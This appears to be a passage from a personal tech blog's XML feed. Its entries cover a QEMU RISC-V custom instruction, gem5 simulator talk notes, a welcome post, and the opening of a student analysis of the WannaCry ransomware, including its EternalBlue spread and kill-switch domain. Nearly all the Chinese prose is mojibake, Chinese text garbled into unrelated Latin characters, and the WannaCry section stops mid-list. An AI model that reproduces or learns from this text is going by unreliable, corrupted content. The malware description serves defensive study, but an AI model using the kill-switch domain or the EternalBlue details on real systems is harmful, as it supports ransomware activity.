æŒ‡ä»¤å¼ºåˆ¶å°†å˜é‡ <code>a</code> çš„å€¼èµ‹ç»™ <code>a0</code> å¯„å­˜å™¨,è¿™æ ·å°±èƒ½æˆåŠŸå°†å€¼è¿”å›ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">riscv64-unknown-elf-gcc  -o x x.c</span><br><span class="line">../qemu-riscv64 xx</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ©ç”¨ä»¥ä¸ŠæŒ‡ä»¤æ‰§è¡Œï¼Œè¿”å›æ­£ç¡®çš„ç»“æœ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add16:=0xfffcfffe</span><br><span class="line">  add:=0xfffdfffe</span><br></pre></td></tr></table></figure><p><code>add16</code> ç”±äºæ¯16ä½è¿›è¡Œè®¡ç®—ï¼Œæ‰€ä»¥æ— å<strong>16</strong>ä½çš„è¿›ä½ï¼Œä¸­é—´ä½æ˜¯<code>c</code>ï¼Œè€Œ<code>add</code>ç”±äºæœ‰è¿›ä½ï¼Œæ‰€ä»¥æ˜¯<code>d</code></p><hr><p>åœ¨QEMUä¸­å®šåˆ¶æŒ‡ä»¤çš„æµç¨‹å¤§è‡´å¦‚åŒæœ¬æ–‡çš„ä»‹ç»ï¼Œä½†æ˜¯ç”±äº <code>add16</code> ä»…æ¶‰åŠæ•°å€¼çš„è®¡ç®—ï¼Œè€Œæ²¡æœ‰åƒ</p><p><code>csr</code> ç›¸å…³æŒ‡ä»¤æ¶‰åŠ <code>CPURISCVState</code> çš„æ›´æ–°ï¼Œä»¥åŠåƒ<code>jal</code>æŒ‡ä»¤æ¶‰åŠ<code>DisasContext</code>çš„åˆ¤æ–­ï¼Œå› æ­¤ç›¸å¯¹ç®€å•ï¼Œå¯¹äºå…¶ä»–æŒ‡ä»¤ï¼Œéœ€è¦åœ¨å¥½å¥½çš„ç ”ç©¶ä»¥ä¸‹</p><blockquote><p>Refrences:</p><p><a href="https://0xc0de.tw/QEMU-%E4%BD%BF%E7%94%A8-Decodetree-%E6%96%B0%E5%A2%9E-RISC-V-%E6%8C%87%E4%BB%A4/">QEMU-ä½¿ç”¨ Decodetreeæ–°å¢ RISC-V æŒ‡ä»¤</a></p><p><a href="https://quasilyte.dev/blog/post/riscv32-custom-instruction-and-its-simulation/#adding-mac-instruction-to-the-rv32im">RISC-V: custom instruction and its simulation</a></p><p><a href="https://github.com/riscv/riscv-p-spec/blob/master/P-ext-proposal.adoc">riscv-p-spec</a></p></blockquote><p>æ„Ÿè°¢åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œè€å¸ˆä»¬çš„æŒ‡å¯¼ï¼Œéå¸¸æ„Ÿè°¢ï¼ï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> QEMU </tag>
            
            <tag> RISC-V </tag>
            
            <tag> sim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Up to Date</title>
      <link href="/2021/02/01/hello-world/"/>
      <url>/2021/02/01/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="Welcome-to-my-blog"><a href="#Welcome-to-my-blog" class="headerlink" title="Welcome to my blog !"></a>Welcome to my blog !</h3><p>åœ¨è¿™é‡Œæˆ‘å°†åˆ†äº«ä¸€äº›æŠ€æœ¯ç»†èŠ‚å’Œç›¸å…³è¿‡ç¨‹ï¼Œä¸æ–­æ›´æ–°ä¸­</p><p>æ¬¢è¿æ¥æˆ‘çš„åšå®¢ - å»ºè®¾ç¨‹åº¦ 10/100</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Gem5 æ¼”è®²ç¨¿</title>
      <link href="/2021/01/13/Gem5%20%E6%BC%94%E8%AE%B2%E7%A8%BF/"/>
      <url>/2021/01/13/Gem5%20%E6%BC%94%E8%AE%B2%E7%A8%BF/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯ gem5 è§†é¢‘æ­é…çš„æ¼”è®²ç¨¿çš„éƒ¨åˆ†å†…å®¹<br><a href="https://www.bilibili.com/video/BV155411J7gY?from=search&seid=12575992805936022279">è§†é¢‘åœ°å€</a></p><p><a href="https://github.com/isrc-cas/PLCT-Open-Reports/blob/master/20210120-Gem5-LuRuibo.pdf">slidesåœ°å€</a></p><a id="more"></a><h1 id="Gem5-æ¼”è®²ç¨¿"><a href="#Gem5-æ¼”è®²ç¨¿" class="headerlink" title="Gem5 æ¼”è®²ç¨¿"></a>Gem5 æ¼”è®²ç¨¿</h1><h3 id="Atomic"><a href="#Atomic" class="headerlink" title="Atomic"></a>Atomic</h3><ol><li><strong>è®¡æ—¶</strong>-è®¡æ—¶è®¿é—®æ˜¯æœ€è¯¦ç»†çš„è®¿é—®ã€‚å®ƒä»¬åæ˜ äº†æˆ‘ä»¬ä¸ºå®ç°å®é™…æ—¶é—´æ‰€åšçš„æœ€å¤§åŠªåŠ›ï¼Œå¹¶åŒ…æ‹¬æ’é˜Ÿå»¶è¿Ÿå’Œèµ„æºäº‰ç”¨çš„å»ºæ¨¡ã€‚ä¸€æ—¦åœ¨å°†æ¥çš„æŸä¸ªæ—¶é—´ç‚¹æˆåŠŸå‘é€äº†è®¡æ—¶è¯·æ±‚ï¼Œåˆ™å‘é€è¯·æ±‚çš„è®¾å¤‡å°†æ— æ³•è·å¾—å“åº”ï¼Œæˆ–è€…å¦‚æœæ— æ³•å®Œæˆè¯·æ±‚ï¼Œåˆ™å°†è·å¾—NACKï¼ˆä»¥ä¸‹æ›´å¤šå†…å®¹ï¼‰ã€‚å®šæ—¶å’ŒåŸå­è®¿é—®ä¸èƒ½åœ¨å†…å­˜ç³»ç»Ÿä¸­å…±å­˜ã€‚</li><li><strong>åŸå­</strong>è®¿é—®-åŸå­è®¿é—®æ¯”è¯¦ç»†è®¿é—®è¦å¿«ã€‚å®ƒä»¬ç”¨äºå¿«é€Ÿè½¬å‘å’Œé¢„çƒ­ç¼“å­˜ï¼Œå¹¶è¿”å›å¤§çº¦æ—¶é—´æ¥å®Œæˆè¯·æ±‚ï¼Œè€Œä¸ä¼šå¼•èµ·ä»»ä½•èµ„æºäº‰ç”¨æˆ–æ’é˜Ÿå»¶è¿Ÿã€‚å‘é€åŸå­è®¿é—®åï¼Œå°†åœ¨å‡½æ•°è¿”å›æ—¶æä¾›å“åº”ã€‚åŸå­å’Œå®šæ—¶è®¿é—®ä¸èƒ½åœ¨å†…å­˜ç³»ç»Ÿä¸­å…±å­˜ã€‚</li><li><strong>åŠŸèƒ½æ€§</strong>-ä¸åŸå­æ€§è®¿é—®ä¸€æ ·ï¼ŒåŠŸèƒ½æ€§è®¿é—®æ˜¯ç¬é—´å‘ç”Ÿçš„ï¼Œä½†æ˜¯ä¸åŸå­æ€§è®¿é—®ä¸åŒï¼Œå®ƒä»¬å¯ä»¥ä¸åŸå­æ€§æˆ–å®šæ—¶è®¿é—®å…±å­˜äºå­˜å‚¨ç³»ç»Ÿä¸­ã€‚åŠŸèƒ½æ€§è®¿é—®ç”¨äºè¯¸å¦‚åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ£€æŸ¥/æ›´æ”¹æ¨¡æ‹Ÿç³»ç»Ÿä¸­çš„å˜é‡ä»¥åŠå…è®¸å°†è¿œç¨‹è°ƒè¯•å™¨é™„åŠ åˆ°æ¨¡æ‹Ÿå™¨ä¹‹ç±»çš„äº‹æƒ…ã€‚é‡è¦è¯´æ˜æ˜¯è®¾å¤‡æ¥æ”¶åˆ°åŠŸèƒ½è®¿é—®æ—¶ï¼Œå¦‚æœå®ƒåŒ…å«ä¸€ä¸ªæ•°æ®åŒ…é˜Ÿåˆ—ï¼Œåˆ™å¿…é¡»åœ¨æ‰€æœ‰æ•°æ®åŒ…ä¸­æœç´¢è¯¥åŠŸèƒ½è®¿é—®æ­£åœ¨æ‰§è¡Œçš„è¯·æ±‚æˆ–å“åº”ï¼Œå¹¶ä¸”å¿…é¡»å¯¹å…¶è¿›è¡Œé€‚å½“æ›´æ–°ã€‚è¯¥<code>Packet::intersect()</code>å’Œ<code>fixPacket()</code>æ–¹æ³•å¯ä»¥å¸®åŠ©è¿™ä¸€ç‚¹ã€‚</li></ol><h3 id="O3-Cpu"><a href="#O3-Cpu" class="headerlink" title="O3 Cpu"></a>O3 Cpu</h3><p>Fetchï¼šåœ¨æ¯ä¸ªå‘¨æœŸè·å–æŒ‡ä»¤ï¼Œå¹¶æ ¹æ®æ‰€é€‰ç­–ç•¥é€‰æ‹©è¦ä»å“ªä¸ªçº¿ç¨‹è·å–ä¿¡æ¯ã€‚åœ¨æ­¤é˜¶æ®µï¼Œé¦–å…ˆåˆ›å»ºDynInstã€‚è¿˜å¤„ç†åˆ†æ”¯é¢„æµ‹ã€‚</p><p>Decode:  å¤„ç†PCç›¸å…³çš„æ— æ¡ä»¶åˆ†æ”¯çš„å¤„ç†</p><p>Renameï¼šåˆ©ç”¨PR File,ä¸¤ç§æƒ…å†µä¼šç»ˆæ­¢ï¼š æ²¡æœ‰è¶³å¤Ÿå¯„å­˜å™¨æ¥é‡å‘½åï¼Œåç»­èµ„æºå·²ç»ç”¨å®Œ(åºåˆ—åŒ–æŒ‡ä»¤ )</p><p>IEW ï¼š å°†æŒ‡ä»¤åˆ†æ´¾ç»™æŒ‡ä»¤é˜Ÿåˆ—ï¼Œå‘Šè¯‰æŒ‡ä»¤é˜Ÿåˆ—å‘å‡ºæŒ‡ä»¤ï¼Œæ‰§è¡Œå¹¶å†™å›æŒ‡ä»¤</p><p>Commit: å¤„ç†æŒ‡ä»¤å¯èƒ½å¼•èµ·çš„ä»»ä½•æ•…éšœã€‚è¿˜å¯ä»¥åœ¨åˆ†æ”¯é¢„æµ‹é”™è¯¯çš„æƒ…å†µä¸‹å¤„ç†é‡å®šå‘å‰ç«¯ã€‚</p><p>E in E : æœ€åæ‰§è¡Œå­˜åœ¨æ½œåœ¨çš„é”™è¯¯ï¼Œè¿™äº›é”™è¯¯ä¸ä¼šåœ¨ç¨‹åºç»“æœä¸­æ˜¾ç¤ºã€‚å…¶æ¬¡ï¼Œé€šè¿‡åœ¨æµæ°´çº¿çš„å¼€å§‹æ‰§è¡Œï¼ŒæŒ‡ä»¤å…¨éƒ¨æŒ‰é¡ºåºæ‰§è¡Œï¼Œé‚£ä¹ˆä¹±åºçš„load interactionè´Ÿè½½äº¤äº’ä¼šä¸¢å¤±ã€‚æˆ‘ä»¬çš„æ¨¡å‹èƒ½å¤Ÿé¿å…è¿™äº›å› æµæ°´çº¿è®¾è®¡äº§ç”Ÿçš„ä¸è¶³å¹¶æä¾›å‡†ç¡®çš„æ—¶åºæ¨¡å‹ã€‚</p><p>Template Policy: åˆ©ç”¨æ¨¡æ¿æ¥å®ç°å¤šæ€æ€§ï¼Œä¸»è¦æ˜¯åˆ©ç”¨ Impl å®šä¹‰ç±»ï¼Œä¼˜ç‚¹æ˜¯ä¸éœ€è¦ä¼ ç»Ÿè™šæ‹Ÿå‡½æ•°/åŸºç±»ã€‚ä¸»è¦ç¼ºç‚¹æ˜¯å¿…é¡»åœ¨ç¼–è¯‘æ—¶å®Œå…¨å®šä¹‰CPUï¼Œå¹¶ä¸”æ¨¡æ¿åŒ–çš„ç±»éœ€è¦æ‰‹åŠ¨å®ä¾‹åŒ–ã€‚</p><p>ISA ç‹¬ç«‹æ€§ï¼š å°†ä»£ç åˆ†ä¸º ä¸ ISA æ— å…³å’ŒISAæœ‰å…³çš„ä»£ç ï¼Œæé«˜å¤ç”¨æ€§</p><p>åˆ†æ”¯é¢„æµ‹ï¼šåˆ†æ”¯æ˜¯é”™è¯¯æ—¶ï¼Œé€šçŸ¥ commit stage å‹ç¼©ROBå†…ä¸ç”¨çš„ä»£ç </p><h3 id="CLassic-Memory-System"><a href="#CLassic-Memory-System" class="headerlink" title="CLassic Memory System"></a>CLassic Memory System</h3><p><strong>MOESI:</strong>  æ•°æ®ä¸€è‡´æ€§åè®® Owned çŠ¶æ€çœä¸€æ¬¡è¯»</p><p>express snoops: åŸå­çš„ï¼Œèƒ½ç¬é—´è¿”å›ï¼Œåœ¨æ—¶åºæ¨¡å¼ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œé˜²æ­¢æ³›æ´ª</p><p>cacheï¼š å†…å­˜æ˜ å°„æ•°æ®åŒ…å’Œä¾¦å¬æ•°æ®åŒ…ã€‚å†…å­˜æ˜ å°„çš„è¯·æ±‚åœ¨å†…å­˜å±‚æ¬¡ç»“æ„ä¸­å‘ä¸‹ï¼Œè€Œå“åº”åœ¨å†…å­˜å±‚æ¬¡ç»“æ„ä¸­å‘ä¸Šï¼ˆç›¸åŒçš„è·¯ç”±è¿”å›ï¼‰ã€‚ä¾¦å¬è¯·æ±‚åœ¨ç¼“å­˜å±‚æ¬¡ç»“æ„ä¸­æ²¿æ°´å¹³æ–¹å‘ç§»åŠ¨ï¼Œä¾¦å¬å“åº”åœ¨å±‚æ¬¡ç»“æ„ä¸­æ²¿æ°´å¹³æ–¹å‘å‘ä¸‹ï¼ˆç›¸åŒçš„è·¯ç”±è¿”å›ï¼‰ã€‚æ™®é€šç›‘å¬åœ¨æ°´å¹³æ–¹å‘ä¸Šè¿è¡Œï¼Œè€Œå¿«é€Ÿç›‘å¬åˆ™åœ¨ç¼“å­˜å±‚æ¬¡ç»“æ„ä¸­ã€‚</p><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>SLICC :  ä»£è¡¨ç”¨äº<em>å®ç°ç¼“å­˜ä¸€è‡´æ€§çš„è§„èŒƒè¯­è¨€</em>ã€‚æœ¬è´¨ä¸Šï¼Œç¼“å­˜ä¸€è‡´æ€§åè®®çš„è¡Œä¸ºç±»ä¼¼äºçŠ¶æ€æœºã€‚SLICCç”¨äºæŒ‡å®šçŠ¶æ€æœºçš„è¡Œä¸ºã€‚å¹¶å¯æ–½åŠ æŸç§çº¦æŸã€‚ä¾‹å¦‚ï¼ŒSLICCå¯ä»¥é™åˆ¶å•ä¸ªå¾ªç¯ä¸­å¯èƒ½å‘ç”Ÿçš„è½¬æ¢æ•°é‡ã€‚é™¤äº†åè®®è§„èŒƒå¤–ï¼ŒSLICCè¿˜å°†å†…å­˜æ¨¡å‹ä¸­çš„æŸäº›ç»„ä»¶ç»„åˆåœ¨ä¸€èµ·ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒçŠ¶æ€æœºä»äº’è¿ç½‘ç»œçš„è¾“å…¥ç«¯å£è·å–è¾“å…¥ï¼Œå¹¶åœ¨ç½‘ç»œçš„è¾“å‡ºç«¯å£å°†è¾“å‡ºæ’é˜Ÿï¼Œä»è€Œå°†ç¼“å­˜/å†…å­˜æ§åˆ¶å™¨ä¸äº’è¿ç½‘ç»œæœ¬èº«è¿æ¥åœ¨ä¸€èµ·ã€‚</p><p>sequencerï¼š Sequencerç±»è´Ÿè´£å‘å¤„ç†å™¨å­ç³»ç»Ÿï¼ˆåŒ…æ‹¬ç¼“å­˜å’Œç‰‡å¤–å†…å­˜ï¼‰æä¾›æ¥è‡ªå¤„ç†å™¨çš„åŠ è½½/å­˜å‚¨/åŸå­å†…å­˜è¯·æ±‚ã€‚å½“æ¯ä¸ªå†…å­˜è¯·æ±‚ç”±å†…å­˜å­ç³»ç»Ÿå®Œæˆæ—¶ï¼Œä¹Ÿä¼šé€šè¿‡å®šåºå™¨å°†å“åº”å‘é€å›å¤„ç†å™¨ã€‚ç³»ç»Ÿä¸­æ¨¡æ‹Ÿçš„æ¯ä¸ªç¡¬ä»¶çº¿ç¨‹ï¼ˆæˆ–å†…æ ¸ï¼‰éƒ½æœ‰ä¸€ä¸ªå®šåºå™¨</p><p>Replacement Policiesï¼š LRU å’Œ Pseudo-LRU</p><p>TOPAZ -è¯¥æ¨¡æ‹Ÿå™¨å·²å‡†å¤‡å¥½åœ¨gem5ä¸­è¿è¡Œï¼Œå¹¶åœ¨åŸå§‹çš„rubyç½‘ç»œæ¨¡æ‹Ÿå™¨ä¸Šæ·»åŠ äº†å¤§é‡åŠŸèƒ½ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> sim </tag>
            
            <tag> gem5 </tag>
            
            <tag> risc-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WannaCry çš„å…·ä½“çš„ç»†èŠ‚çš„åˆ†æ</title>
      <link href="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
      <url>/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯é’ˆå¯¹WannaCry çš„å…·ä½“çš„ç»†èŠ‚çš„åˆ†æ</p><p><a href="https://bbs.pediy.com/thread-249520.htm">REFERENCE</a></p><a id="more"></a><h1 id="WannaCry-ç—…æ¯’åˆ†æ"><a href="#WannaCry-ç—…æ¯’åˆ†æ" class="headerlink" title="WannaCry ç—…æ¯’åˆ†æ"></a>WannaCry ç—…æ¯’åˆ†æ</h1><h3 id="Virus-Analysis-Of-WannaCry"><a href="#Virus-Analysis-Of-WannaCry" class="headerlink" title="Virus Analysis Of WannaCry"></a>Virus Analysis Of WannaCry</h3><p>[TOC]</p><h3 id="å¼•-è¨€"><a href="#å¼•-è¨€" class="headerlink" title="å¼• è¨€"></a>å¼• è¨€</h3><p>æœ¬æ¬¡å¤§ä½œä¸šä¸»è¦å¯¹WannaCryç—…æ¯’çš„è¡Œä¸ºå’Œå…·ä½“ä»£ç çš„å®ç°é€»è¾‘è¿›è¡Œåˆ†æï¼Œä¹‹å‰æœ‰ä¸€äº›å‰è¾ˆå·²ç»å¯¹ç—…æ¯’å¤§ä½“æƒ…å†µåšå‡ºäº†ç›¸å…³çš„åˆ†æã€‚æœ¬æ¬¡å¤§ä½œä¸šå°†ä¼šåˆ©ç”¨ç°æœ‰èƒ½æ‰¾åˆ°çš„å‰äººçš„æ‰€æœ‰åˆ†æè¿›è¡Œæ±‡æ€»ç»†åŒ–ï¼Œå¹¶ç»“åˆè‡³ä»Šä¸ºæ­¢ç—…æ¯’çš„å˜ç§æƒ…å†µï¼Œè¿›è¡Œé’ˆå¯¹äº‹å®ä¸ç°é‡‘æƒ…å†µçš„é€»è¾‘ï¼Œå˜ç§å’Œé˜²èŒƒæ–¹æ³•åˆ†æï¼Œé€šè¿‡ä¾ç…§äº‹å®çš„åˆ†æï¼Œè§£ç­”å¤§å®¶å¯¹ç—…æ¯’çš„ç–‘é—®å’Œè¯¯è§£</p><p>æœ¬æ¬¡å¤§ä½œä¸šçš„äº®ç‚¹åœ¨äºï¼š</p><ol><li><p> é€šè¿‡äº†ç—…æ¯’å‘ä½œåˆ°ç°åœ¨çš„æ²‰æ·€ï¼Œç—…æ¯’çš„å…·ä½“è¡Œä¸ºå’Œå˜ç§ä¹Ÿç»è¿‡äº†å‘å±•å’Œæ²‰æ·€ï¼Œé€šè¿‡ç»¼åˆèƒ½å¾—åˆ°æ›´é€‚åˆç°åœ¨çš„æ–¹æ³•</p></li><li><p> é€šè¿‡å¯¹ç—…æ¯’å˜ç§çš„åˆ†æï¼Œåˆ†æç—…æ¯’çš„æ¼”å˜æƒ…å†µï¼Œäº†è§£ç—…æ¯’åœ¨å‘ä½œä¹‹åå¯èƒ½ä¼šæœ‰ä»€ä¹ˆæ ·çš„æ”¹å˜</p></li><li><p> é€šè¿‡åŸºäºäº‹å®çš„æ¨æµ‹ï¼Œæ¨ç¿»å¤§ä¼—å¯¹ç—…æ¯’è¯¯è§£ï¼Œå¯¹ç—…æ¯’æœ‰åŸºäºç§‘å­¦çš„è®¤è¯†ã€‚</p></li></ol><h2 id="1-ç—…æ¯’æ¦‚å†µ"><a href="#1-ç—…æ¯’æ¦‚å†µ" class="headerlink" title="1 ç—…æ¯’æ¦‚å†µ"></a>1 ç—…æ¯’æ¦‚å†µ</h2><p>2017å¹´5æœˆ12æ—¥ï¼Œæœ¬æ–‡æ‰€åˆ†æçš„å‹’ç´¢ç—…æ¯’WannaCryå€ŸåŠ©é«˜å±æ¼æ´â€æ°¸æ’ä¹‹è“â€ï¼ˆEternalBlueï¼‰åœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…å¿«é€Ÿä¼ æ’­ã€‚ä¸–ç•ŒèŒƒå›´å†…çš„å¾ˆå¤šå›½å®¶ï¼ŒåŒ…æ‹¬ä¿„ç½—æ–¯ã€è¥¿ç­ç‰™ã€æ„å¤§åˆ©ã€è¶Šå—ã€ç¾å›½ã€è‹±å›½ã€ä¸­å›½ã€ç­‰ç™¾ä½™ä¸ªå›½å®¶çš„ä¼ä¸šå’ŒåŒ»é™¢ç­‰æœºæ„æ”¶åˆ°å¤§å¹…åº¦çš„ç ´ç¯ã€‚ä¸æ­¤åŒæ—¶ï¼Œæˆ‘å›½çš„è®¸å¤šè¡Œä¸šæœºæ„å’Œå¤§å‹ä¼ä¸šä¹Ÿè¢«æ”»å‡»ï¼Œæœ‰çš„å•ä½ç”šè‡³â€å…¨å†›è¦†æ²¡â€ï¼Œé€ æˆäº†è¿‘æœŸç½•è§çš„æŸå¤±ã€‚</p><p>æœ¬æŠ¥å‘Šå°†ä»ä¼ æ’­é€”å¾„ã€å±å®³æ–¹å¼å’Œç»“æœã€å—å¨èƒç”¨æˆ·ç¾¤ç­‰è§’åº¦ï¼Œé€ä¸€å˜æ¸…è¿™ä¸ªæ¶æ€§ç—…æ¯’æ–¹æ–¹é¢é¢çš„çœŸç›¸ï¼Œç”¨ä»¥å¸®åŠ©å¤§å®¶è®¤è¯†ã€è§£å†³è¯¥ç—…æ¯’ï¼Œé˜²èŒƒæœªæ¥å¯èƒ½å‡ºç°çš„å˜ç§ç—…æ¯’ï¼ŒåŒæ—¶æ¾„æ¸…ä¸€äº›è°£ä¼ å’Œè°è¨€ã€‚</p><h3 id="1-1-ç—…æ¯’æ”»å‡»è¡Œä¸ºåŠå±å®³"><a href="#1-1-ç—…æ¯’æ”»å‡»è¡Œä¸ºåŠå±å®³" class="headerlink" title="1.1 ç—…æ¯’æ”»å‡»è¡Œä¸ºåŠå±å®³"></a>1.1 ç—…æ¯’æ”»å‡»è¡Œä¸ºåŠå±å®³</h3><p>é­å—WannaCryç—…æ¯’ä¾µå®³çš„ç”µè„‘ï¼Œå…¶æ–‡ä»¶å°†è¢«åŠ å¯†é”æ­»ï¼Œç—…æ¯’å¼€å‘è€…æä¾›äº†ä¸€ä¸ªæ¯”ç‰¹å¸è´¦å·ä¾›æ”¯ä»˜èµé‡‘æ‰“å¼€é”æ­»çš„æ–‡ä»¶ï¼Œä½†æ ¹æ®ç—…æ¯’æºç çš„åˆ†æï¼Œå—å®³è€…å¯èƒ½æ°¸è¿œçš„å¤±å»äº†è¿™äº›æ–‡ä»¶ã€‚WannaCryç—…æ¯’çš„è®¾è®¡å°±æ˜ç¡®çš„è¡¨æ˜äº†ç—…æ¯’<br>å’Œ<br>ç—…æ¯’ä½œè€…ä¸èƒ½å¾—çŸ¥å—å®³è€…æ˜¯å¦æ”¯ä»˜çš„äº†èµé‡‘ï¼Œä¸”ç—…æ¯’å¹¶ä¸åŒ…å«ç”¨äºè§£ç çš„ç¥å¥‡æ•°ï¼Œæ‰€ä»¥å³ä½¿æ”¯ä»˜äº†èµé‡‘ï¼Œå¤§æ¦‚ç‡ä¹Ÿä¸èƒ½å¾—åˆ°æ¢å¤å¯†é’¥</p><p>ç½‘ä¸Šæµä¼ çš„â€è§£å¯†æ–¹æ³•â€åªæ˜¯â€æ–‡ä»¶æ¢å¤å·¥å…·â€ï¼Œå¯ä»¥æ¢å¤ä¸€äº›è¢«åˆ é™¤çš„æ–‡ä»¶ï¼Œä½†æ˜¯ä½œç”¨æœ‰é™ã€‚è¿™æ˜¯å› ä¸ºæ®ç—…æ¯’æºç åˆ†æï¼Œæ–‡ä»¶çš„åŠ å¯†è¿‡ç¨‹æ˜¯åŠ å¯†åå†åˆ é™¤åŸå§‹æ–‡ä»¶ï¼Œæ–‡ä»¶æ¢å¤å·¥å…·å¯èƒ½å¯ä»¥æ¢å¤åˆ é™¤çš„åŸå§‹æ–‡ä»¶ã€‚ä½†æ˜¯ç—…æ¯’å¯¹äºæ–‡ä»¶çš„æ“ä½œæ˜¯ååˆ†é¢‘ç¹çš„ï¼Œåˆ é™¤æ–‡ä»¶æ‰€ä¿å­˜çš„æ•°æ®å—å¯èƒ½ä¼šè¢«è¦†ç›–ï¼Œè€Œä¸”éšç€ç—…æ¯’æ‰§è¡Œæ—¶é—´çš„å¢åŠ ï¼Œæ¢å¤çš„å¯èƒ½æ€§ä¼šé€æ¸é™ä½ã€‚</p><h3 id="1-2-ä¼ æ’­é€”å¾„å’Œæ”»å‡»æ–¹å¼"><a href="#1-2-ä¼ æ’­é€”å¾„å’Œæ”»å‡»æ–¹å¼" class="headerlink" title="1.2 ä¼ æ’­é€”å¾„å’Œæ”»å‡»æ–¹å¼"></a>1.2 ä¼ æ’­é€”å¾„å’Œæ”»å‡»æ–¹å¼</h3><p>WannaCryç”±è •è™«+å‹’ç´¢ç—…æ¯’æ„æˆï¼Œè •è™«ä¼ æ’­å’Œé‡Šæ”¾è‡ªå·±ï¼Œåè€…è´Ÿè´£åŠ å¯†æ–‡ä»¶ã€‚</p><p>è •è™«ï¼šè •è™«ç—…æ¯’æ˜¯ä¸€ç§å¸¸è§çš„è®¡ç®—æœºç—…æ¯’ã€‚é€šè¿‡ç½‘ç»œå’Œç”µå­é‚®ä»¶è¿›è¡Œä¼ æ’­ï¼Œå…·æœ‰è‡ªæˆ‘å¤åˆ¶å’Œä¼ æ’­è¿…é€Ÿç­‰ç‰¹ç‚¹ã€‚æ­¤æ¬¡ç—…æ¯’åˆ¶é€ è€…æ­£æ˜¯åˆ©ç”¨äº†ç¾å›½å›½å®¶å®‰å…¨å±€(NSA)<br>æ³„æ¼çš„Windows<br>SMBè¿œç¨‹æ¼æ´åˆ©ç”¨å·¥å…·â€æ°¸æ’ä¹‹è“â€æ¥è¿›è¡Œä¼ æ’­çš„ã€‚æ®æ‚‰ï¼Œè •è™«ä»£ç è¿è¡Œåå…ˆä¼šè¿æ¥åŸŸåï¼šhxxp: //<a href="http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com/">www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</a><br>å¦‚æœè¯¥åŸŸåå¯ä»¥æˆåŠŸè¿æ¥ï¼Œåˆ™ç›´æ¥åœæ­¢ã€‚è€Œå¦‚æœä¸Šè¿°åŸŸåæ— æ³•è®¿é—®ï¼Œåˆ™ä¼šå®‰è£…ç—…æ¯’æœåŠ¡ï¼Œåœ¨å±€åŸŸç½‘ä¸å¤–ç½‘è¿›è¡Œä¼ æ’­ã€‚</p><p>ä½†æ˜¯æ— è®ºè¿™ä¸ªâ€ç¥å¥‡å¼€å…³â€æ˜¯å¦å¼€å¯ï¼Œè¯¥ç—…æ¯’éƒ½ä¼šæ”»å‡»ç”¨æˆ·ï¼Œé”æ­»æ–‡ä»¶ã€‚å¦å¤–ï¼Œè¿™ä¸ªå¼€å…³ç¨‹åºå¾ˆå®¹æ˜“è¢«ç—…æ¯’åˆ¶é€ è€…å»é™¤ï¼Œå› æ­¤æœªæ¥å¯èƒ½å‡ºç°æ²¡æœ‰å¼€å…³çš„å˜ç§ç—…æ¯’ã€‚</p><h3 id="1-3-æ˜“å—æ”»å‡»ç”¨æˆ·ç¾¤"><a href="#1-3-æ˜“å—æ”»å‡»ç”¨æˆ·ç¾¤" class="headerlink" title="1.3 æ˜“å—æ”»å‡»ç”¨æˆ·ç¾¤"></a>1.3 æ˜“å—æ”»å‡»ç”¨æˆ·ç¾¤</h3><p>å¤§å‹ä¼ä¸šå’Œå…¬å…±è®¾æ–½å æ”¶åˆ°æ”»å‡»çš„ä¸»æœºçš„å¤§å¤šæ•°ï¼Œä¸ªäººç”¨æˆ·å—æ”»å‡»è¾ƒå°‘ã€‚æ¥ä¸‹æ¥ï¼Œå°†ä»ä¸¤ä¸ªæ–¹é¢è¯´æ˜æ˜“å—æ”»å‡»ç”¨æˆ·ç¾¤çš„ç‰¹ç‚¹</p><p>æ“ä½œç³»ç»Ÿï¼šé¦–å…ˆï¼Œè¯¥ç—…æ¯’åªæ”»å‡»Windowsç³»ç»Ÿçš„ç”µè„‘ï¼Œå‡ ä¹æ‰€æœ‰çš„Windowsç³»ç»Ÿå¦‚æœæ²¡æœ‰æ‰“è¡¥ä¸ï¼Œéƒ½ä¼šè¢«æ”»å‡»ã€‚è€ŒWindows<br>Vistaã€Windows Server 2008ã€Windows 7ã€Windows Server 2008 R2ã€Windows<br>8.1ã€Windows Server 2012ã€Windows Server 2012 R2ã€Windows Server 